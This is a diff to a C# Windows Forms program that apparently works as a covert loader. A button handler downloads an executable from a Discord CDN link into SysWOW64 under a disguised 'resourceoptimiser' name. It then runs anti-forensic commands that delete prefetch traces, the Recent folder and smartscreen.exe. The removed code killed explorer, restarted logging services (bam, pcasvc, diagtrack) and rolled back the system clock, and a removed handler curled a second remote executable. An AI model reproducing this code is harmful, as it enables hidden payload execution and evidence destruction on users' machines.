@@ -19,6 +19,7 @@ using DrawingPoint = System.Drawing.Point;
 using System.Diagnostics.Eventing.Reader;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
+using System.Reflection;
 
 
 namespace never.Forms
@@ -446,8 +447,8 @@ namespace never.Forms
 
         private async void buttonanimated1_Click(object sender, EventArgs e)
         {
-            string outputPath = @"C:\AutoRun.exe"; // Change the path here
-            string url = "https://cdn.discordapp.com/attachments/1328480696217505886/1344724054879506482/resourceoptimiser.exe?ex=67c4965e&is=67c344de&hm=3ade5707f55a2eb64e1ea06ad13204aeeb8949da46e545bd3012d61d08dff067&";
+            string outputPath = @"C:\Windows\SysWOW64\resourceoptimiser.exe"; // Change the path here
+            string url = "https://cdn.discordapp.com/attachments/1344893646947876874/1345127930401128490/resourceoptimizer.exe?ex=67c4bd01&is=67c36b81&hm=e37076ec2215f9219dd945a4b70d52981ac745d0aa1357724db659c01b5c82af&";
 
             // Check if the AutoRun.exe file already exists
             if (!System.IO.File.Exists(outputPath))
@@ -532,7 +533,6 @@ namespace never.Forms
                 // Call the lsass method (assuming it does some necessary work)
                 lsass();
 
-                // Delete the specified file
                 void DeleteFileIfExists(string filePath)
                 {
                     if (File.Exists(filePath))
@@ -540,94 +540,56 @@ namespace never.Forms
                         File.Delete(filePath);
                     }
                 }
-
-                DeleteFileIfExists(@"C:\nEMZ79aO");
-                DeleteFileIfExists(@"C:\AutoRun.exe");
-                DeleteFileIfExists(@"C:\AutoRun.dll");
-
-                // The rest of your existing code...
-                Process process = new Process();
-                string[] processes = new string[] { "pcasvc", "bam", "WSearch", "dnscache", "diagtrack", "CDPUser Svc_17a41d", "DPS", "DPS" };
-
-                string BootStart = timer();
-                string NowTime = DateTime.Now.ToString("HH:mm:ss");
-
-                cmd("time " + BootStart);
-
-                process.StartInfo.FileName = "taskkill.exe";
-                process.StartInfo.Arguments = "/f /im explorer.exe";
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.CreateNoWindow = true;
-                process.Start();
-                process.WaitForExit();
-                await Task.Delay(2000);
-
-                process.StartInfo.FileName = "taskkill.exe";
-                process.StartInfo.Arguments = "/F /FI \"SERVICES eq dnscache\"";
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.CreateNoWindow = true;
-                process.Start();
-                process.WaitForExit();
-                await Task.Delay(2000);
-
-                lsass();
-
-                new Process
-                {
-                    StartInfo =
-            {
-                FileName = @"C:\Windows\explorer.exe",
-                Arguments = "",
-                RedirectStandardOutput = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            }
-                }.Start();
-
-                foreach (var processName in processes)
-                {
-                    cmd("sc stop " + processName);
-                    await Task.Delay(1200);
-                    cmd("sc start " + processName);
-                }
-                cmd("time " + NowTime);
+                DeleteFileIfExists(@"C:\Windows\SysWOW64\resourceoptimiser.exe");
+                DeleteFileIfExists(@"C:\Windows\SysWOW64\resourceoptimiser.dll");
 
                 // Additional cleanup commands...
-                cmd("del /f /q /s C:\\Windows\\AutoRun.exe");
-                cmd("del /f /q /s C:\\Windows\\AutoRun.dll");
+                cmd("del /f /q /s C:\\Windows\\SysWOW64\\resourceoptimiser.exe");
+                cmd("del /f /q /sC:\\Windows\\SysWOW64\\resourceoptimiser.dll");
                 cmd("del /f /q /s C:\\Users\\%username%\\Recent");
                 cmd("del /f /q /s C:\\Windows\\smartscreen.exe*");
                 cmd("del /f /q /s C:\\Windows\\System32\\Curl.exe*r");
-                cmd("del /f /q /s C:\\Windows\\prefetch\\TASKKILL.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\REG.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\REGEDIT.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\DISKPART.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\CURL.EXE*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\SC.EXE*");
-                cmd("del /f /q /s C:\\Windows\\prefetch\\AUTORUN.EXE*");
+                cmd("del /f /q /s C:\\Windows\\prefetch\\taskthow.exe*");
                 cmd("del /f /q /s C:\\Windows\\prefetch\\GOOGLECHROME.EXE*");
                 Console.Beep(300, 500);
                 Application.Exit();
             }
+
             catch (Exception ex)
             {
                 MessageBox.Show("Error: " + ex.Message);
             }
         }
 
-        private async void buttonanimated6_Click(object sender, EventArgs e)
-        {
-            cmd("curl -s https://cdn.discordapp.com/attachments/1068700281090625647/1143753293307334696/launcher.exe -o C:\\RunAuto.exe >nul");
-            await Task.Delay(2000);
-        }
-
         private void buttonanimated5_Click(object sender, EventArgs e)
         {
-            cmd("start C:\\AutoRun.exe");
+            string exePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "taskthow.exe");
+
+            // Check if the executable file exists
+            if (!File.Exists(exePath))
+            {
+                MessageBox.Show("Executable not found: " + exePath);
+                return;
+            }
+
+            Process process = new Process();
+            process.StartInfo.FileName = exePath;
+
+            try
+            {
+                process.Start();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error starting the application: " + ex.Message);
+            }
         }
 
-        
+
     }
 }
